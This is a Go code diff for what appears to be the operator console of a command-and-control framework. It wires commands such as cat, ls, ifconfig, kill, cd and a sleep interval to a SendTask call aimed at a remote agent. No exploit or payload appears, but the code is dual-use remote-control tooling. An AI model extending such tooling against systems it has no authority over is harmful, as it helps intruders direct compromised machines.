@@ -106,7 +106,7 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 			a.String("sleep", "(in seconds)")
 		},
 		Run: func(c *grumble.Context) error {
-			return nil
+			return SendTask(agentid, "sleep", c.Args.String("sleep"))
 		},
 	})
 
@@ -134,7 +134,7 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 			a.String("file", "path to file")
 		},
 		Run: func(c *grumble.Context) error {
-			return nil
+			return SendTask(agentid, "cat", c.Args.String("file"))
 		},
 	})
 
@@ -143,10 +143,10 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 		Help:    "list contents of directory",
 		Aliases: []string{"dir"},
 		Args: func(a *grumble.Args) {
-			a.String("path", "dir to read", grumble.Default("./"))
+			a.String("path", "dir to read")
 		},
 		Run: func(c *grumble.Context) error {
-			return nil
+			return SendTask(agentid, "ls", c.Args.String("path"))
 		},
 	})
 
@@ -163,7 +163,7 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 		Help:    "get network interfaces",
 		Aliases: []string{"ipconfig"},
 		Run: func(c *grumble.Context) error {
-			return nil
+			return SendTask(agentid, "ifconfig", "")
 		},
 	})
 
@@ -174,7 +174,7 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 			a.String("pid", "process id to kill")
 		},
 		Run: func(c *grumble.Context) error {
-			return nil
+			return SendTask(agentid, "kill", c.Args.String("pid"))
 		},
 	})
 
@@ -209,7 +209,7 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 		Name: "pwd",
 		Help: "present working directory",
 		Run: func(c *grumble.Context) error {
-			return nil
+			return SendTask(agentid, "pwd", "")
 		},
 	})
 
@@ -220,7 +220,7 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 			a.String("path", "path to change to")
 		},
 		Run: func(c *grumble.Context) error {
-			return nil
+			return SendTask(agentid, "cd", c.Args.String("path"))
 		},
 	})
 }
